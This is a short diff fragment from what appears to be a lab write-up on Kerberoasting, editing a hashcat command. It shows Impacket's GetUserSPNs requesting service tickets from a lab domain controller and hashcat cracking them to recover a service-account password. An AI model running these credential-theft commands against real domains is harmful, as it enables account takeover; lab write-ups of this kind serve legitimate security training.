@@ -21,7 +21,7 @@ Requested the ticket with Impacket (leaving the password off so the shell prompt
 impacket-GetUserSPNs corp.lab/asnow -dc-ip 10.0.40.10 -request -outputfile kerb.txt
 # type the password at the prompt
 
-hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt -w 1
+hashcat -m 13100 kerb.txt mylist.txt -w 1
 ```
 
 hashcat recovered the service-account password:
